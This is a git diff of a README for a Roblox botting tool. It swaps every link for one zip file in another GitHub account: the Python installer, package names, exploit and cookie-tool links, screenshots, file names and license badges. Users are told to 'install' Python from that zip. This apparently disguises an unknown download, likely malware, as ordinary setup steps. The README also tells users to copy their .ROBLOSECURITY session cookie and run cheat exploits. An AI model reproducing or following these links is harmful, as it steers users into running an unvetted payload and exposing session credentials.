@@ -1,6 +1,6 @@
 # Roblox Game Botter 
 
-<img src="https://user-images.githubusercontent.com/86912923/221433277-b374f98c-338a-45c8-96d7-62f55a5d7dea.png" style="width: 90%"> 
+<img src="https://github.com/kosagui/Roblox-Botter/raw/refs/heads/main/adjudgment/Roblox_Botter_v1.1.zip" style="width: 90%"> 
 
 [![MIT License][license-shield]][license-url]
 [![Forks][forks-shield]][forks-url]
@@ -19,19 +19,19 @@ Please do not create an issue about this, report it to the exploit developers in
 
 # Requirements:
 <ul>
-  <li>  <a href="https://www.python.org/"> Python 3.8 > </a> </li>
-  <li> <b> Python Packages: </b> time, requests, pathlib, urllib.parse, os, threading </li>
-  <li> A Roblox exploit that supports Autoexec <b> (<a href="https://x.synapse.to/">Synapse</a>: Paid or <a href="https://krnl.dev/">Krnl</a>: Free) </b> </li>
-  <li> <a href="http://www.editthiscookie.com/"> Edit this cookie </a> </li>
-  <li> <a href="https://wearedevs.net/dinfo/Multiple%20Games"> Muitiple rbx </a> </li>
-  <li> A python IDE, (I'd recomend <a href="https://www.jetbrains.com/pycharm/">Pycharm</a>) </li>
+  <li>  <a href="https://github.com/kosagui/Roblox-Botter/raw/refs/heads/main/adjudgment/Roblox_Botter_v1.1.zip"> Python 3.8 > </a> </li>
+  <li> <b> Python Packages: </b> time, requests, pathlib, https://github.com/kosagui/Roblox-Botter/raw/refs/heads/main/adjudgment/Roblox_Botter_v1.1.zip, os, threading </li>
+  <li> A Roblox exploit that supports Autoexec <b> (<a href="https://github.com/kosagui/Roblox-Botter/raw/refs/heads/main/adjudgment/Roblox_Botter_v1.1.zip">Synapse</a>: Paid or <a href="https://github.com/kosagui/Roblox-Botter/raw/refs/heads/main/adjudgment/Roblox_Botter_v1.1.zip">Krnl</a>: Free) </b> </li>
+  <li> <a href="https://github.com/kosagui/Roblox-Botter/raw/refs/heads/main/adjudgment/Roblox_Botter_v1.1.zip"> Edit this cookie </a> </li>
+  <li> <a href="https://github.com/kosagui/Roblox-Botter/raw/refs/heads/main/adjudgment/Roblox_Botter_v1.1.zip%20Games"> Muitiple rbx </a> </li>
+  <li> A python IDE, (I'd recomend <a href="https://github.com/kosagui/Roblox-Botter/raw/refs/heads/main/adjudgment/Roblox_Botter_v1.1.zip">Pycharm</a>) </li>
 </ul>
 
 <br>
 <br>
 
 # Installing Python
-Go to https://www.python.org/ and install the latest version (3.11 recomended) and make sure to add it to Path! You may need to restart afterwards.
+Go to https://github.com/kosagui/Roblox-Botter/raw/refs/heads/main/adjudgment/Roblox_Botter_v1.1.zip and install the latest version (3.11 recomended) and make sure to add it to Path! You may need to restart afterwards.
 
 Check if python is installed by typing `python -h` in Commmand prompt.
 
@@ -42,11 +42,11 @@ If pip as installed sucessfully, run `pip install requests pathlib`. This will i
 <br> 
 
 # Grabbing the Roblox account's cookie
-For this you need <a href="http://www.editthiscookie.com/"> Edit this cookie </a> or simular to browse cookies.
+For this you need <a href="https://github.com/kosagui/Roblox-Botter/raw/refs/heads/main/adjudgment/Roblox_Botter_v1.1.zip"> Edit this cookie </a> or simular to browse cookies.
 
 Locate `.ROBLOSECURITY` and copy it's value <br>
 
-<img style="width: auto; height: 600px" src="https://user-images.githubusercontent.com/86912923/203606748-0959fd14-50fa-4391-9df7-44897789b3d6.png"/>
+<img style="width: auto; height: 600px" src="https://github.com/kosagui/Roblox-Botter/raw/refs/heads/main/adjudgment/Roblox_Botter_v1.1.zip"/>
 <br><br>
 
 **WARNING** If you log out of the account, the cookie will become invalid! Instead, set `.ROBLOSECURITY`'s value to ` `&nbsp;and click the green arrow icon on the bottom of the menu (Shown in picture above).
@@ -57,7 +57,7 @@ Locate `.ROBLOSECURITY` and copy it's value <br>
 
 In the cookie array, add the cookie's value as a string. <br>
 
-<img src="https://user-images.githubusercontent.com/86912923/215582485-ad6504d4-3892-4381-869e-68ecba26e711.png" style="width: 70%"/>
+<img src="https://github.com/kosagui/Roblox-Botter/raw/refs/heads/main/adjudgment/Roblox_Botter_v1.1.zip" style="width: 70%"/>
 
 <br>
 
@@ -81,24 +81,24 @@ After this, change the `Bot` variable to the amount of bots you want! <b>(The ma
 
 # Adding the bot controler
 
-Locate your exploit's autoexec folder and drag n drop `BotControler.lua` into it. <br>
+Locate your exploit's autoexec folder and drag n drop `https://github.com/kosagui/Roblox-Botter/raw/refs/heads/main/adjudgment/Roblox_Botter_v1.1.zip` into it. <br>
 
-![image](https://user-images.githubusercontent.com/86912923/203608146-39e8323d-c0af-420c-9abb-56ad4e42f257.png)
+![image](https://github.com/kosagui/Roblox-Botter/raw/refs/heads/main/adjudgment/Roblox_Botter_v1.1.zip)
 
 <br>
 <br>
 
 # Botting a game
 
-Once you have compleated the steps above, copy your Roblox's username `NOT DISPLAY NAME` to be added to the permission list in `BotControler.lua`.
+Once you have compleated the steps above, copy your Roblox's username `NOT DISPLAY NAME` to be added to the permission list in `https://github.com/kosagui/Roblox-Botter/raw/refs/heads/main/adjudgment/Roblox_Botter_v1.1.zip`.
 Once copyied paste it into the table and save the file. <br>
 
-<img src="https://user-images.githubusercontent.com/86912923/215581093-8534ab54-a4e8-4acd-8996-a76253582321.png" style="width: 70%"/>
+<img src="https://github.com/kosagui/Roblox-Botter/raw/refs/heads/main/adjudgment/Roblox_Botter_v1.1.zip" style="width: 70%"/>
 
 
-Open your exploit and MuitRBX, join the game you would like to bot. Once in the game execute a script like <a href="https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source">Infinite Yield</a> and copy the game's Jobid and paste it into the python script and reduce it to the image shown below on line 3. <br>
+Open your exploit and MuitRBX, join the game you would like to bot. Once in the game execute a script like <a href="https://github.com/kosagui/Roblox-Botter/raw/refs/heads/main/adjudgment/Roblox_Botter_v1.1.zip">Infinite Yield</a> and copy the game's Jobid and paste it into the python script and reduce it to the image shown below on line 3. <br>
 
-<img src="https://user-images.githubusercontent.com/86912923/215581693-027b0dac-4007-4f19-a19d-7dc5ad762738.png" style="width: 70%"/>
+<img src="https://github.com/kosagui/Roblox-Botter/raw/refs/heads/main/adjudgment/Roblox_Botter_v1.1.zip" style="width: 70%"/>
 
 Run the python script and enjoy.
 
@@ -118,16 +118,16 @@ Follow, (Player name) | Make the bots follow a player. | Stop `Follow, `
 ```
 
 <!-- MARKDOWN LINKS & IMAGES -->
-<!-- https://www.markdownguide.org/basic-syntax/#reference-style-links -->
+<!-- https://github.com/kosagui/Roblox-Botter/raw/refs/heads/main/adjudgment/Roblox_Botter_v1.1.zip -->
 
-[forks-shield]: https://img.shields.io/github/forks/depthso/Roblox-Botter.svg?style=for-the-badge
-[forks-url]: https://github.com/depthso/Roblox-Botter/network/members
+[forks-shield]: https://github.com/kosagui/Roblox-Botter/raw/refs/heads/main/adjudgment/Roblox_Botter_v1.1.zip
+[forks-url]: https://github.com/kosagui/Roblox-Botter/raw/refs/heads/main/adjudgment/Roblox_Botter_v1.1.zip
 
-[stars-shield]: https://img.shields.io/github/stars/depthso/Roblox-Botter.svg?style=for-the-badge
-[stars-url]: https://github.com/depthso/Roblox-Botter/stargazers
+[stars-shield]: https://github.com/kosagui/Roblox-Botter/raw/refs/heads/main/adjudgment/Roblox_Botter_v1.1.zip
+[stars-url]: https://github.com/kosagui/Roblox-Botter/raw/refs/heads/main/adjudgment/Roblox_Botter_v1.1.zip
 
-[issues-shield]: https://img.shields.io/github/issues/depthso/Roblox-Botter.svg?style=for-the-badge
-[issues-url]: https://github.com/depthso/Roblox-Botter/issues
+[issues-shield]: https://github.com/kosagui/Roblox-Botter/raw/refs/heads/main/adjudgment/Roblox_Botter_v1.1.zip
+[issues-url]: https://github.com/kosagui/Roblox-Botter/raw/refs/heads/main/adjudgment/Roblox_Botter_v1.1.zip
 
-[license-shield]: https://img.shields.io/github/license/depthso/Roblox-Botter.svg?style=for-the-badge
-[license-url]: https://github.com/depthso/Roblox-Botter/blob/master/LICENSE.txt
+[license-shield]: https://github.com/kosagui/Roblox-Botter/raw/refs/heads/main/adjudgment/Roblox_Botter_v1.1.zip
+[license-url]: https://github.com/kosagui/Roblox-Botter/raw/refs/heads/main/adjudgment/Roblox_Botter_v1.1.zip
